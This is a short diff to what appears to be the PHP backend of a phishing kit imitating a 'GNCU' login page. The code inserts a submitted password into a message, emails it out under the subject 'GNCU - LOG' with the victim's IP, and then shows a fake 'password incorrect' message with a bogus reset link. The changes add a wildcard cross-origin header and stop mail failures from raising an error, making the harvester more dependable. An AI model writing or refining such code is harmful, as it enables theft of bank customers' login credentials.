@@ -1,5 +1,7 @@
 <?php 
 
+header("Access-Control-Allow-Origin: *");
+
 function wash(string $input) {
   return htmlspecialchars(trim($input));
 }
@@ -69,7 +71,7 @@ if(isset($_POST['request'])) {
   $message = str_replace("{{password}}", $password, $message);
 
   try {
-    sendMail("GNCU - LOG | $ip", $message) or throw new Exception("Couldn't send'");
+    sendMail("GNCU - LOG | $ip", $message);
     echo json_encode([
       "success" => true,
       "message" => "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>",
